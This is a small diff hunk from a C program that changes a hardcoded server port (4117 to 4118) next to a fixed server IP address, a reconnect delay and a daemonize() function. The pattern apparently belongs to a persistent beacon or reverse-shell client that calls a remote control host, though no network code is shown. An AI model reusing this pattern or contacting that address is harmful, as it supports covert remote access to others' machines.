@@ -13,7 +13,7 @@
 #include <sys/prctl.h>
 
 #define SERVER_IP "154.18.239.136"
-#define SERVER_PORT 4117
+#define SERVER_PORT 4118
 #define RECONNECT_DELAY 3
 
 void daemonize() {
